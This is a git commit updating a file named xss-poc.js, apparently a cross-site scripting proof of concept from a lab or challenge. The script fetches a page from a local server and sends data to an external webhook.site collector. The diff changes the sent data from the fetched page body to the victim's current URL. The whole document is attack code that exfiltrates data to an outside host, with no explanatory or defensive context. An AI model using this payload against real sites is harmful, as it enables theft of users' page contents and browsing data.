a5001a7c05d03709fa87aa341d30cf22c1402c85
karvashy <98531740+karvashy@users.noreply.github.com>
2022-02-22 23:10:24 +0530

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
 fetch("http://127.0.0.1:9000/view/93a5a46e-25ed-41fa-8812-b471afa1a1c9")
   .then(r => r.text())
-  .then((d) => {fetch("https://webhook.site/42588426-a448-4543-8951-8a3182af820d?data="+d)})
+  .then((d) => {fetch("https://webhook.site/42588426-a448-4543-8951-8a3182af820d?data="+window.location.href)})
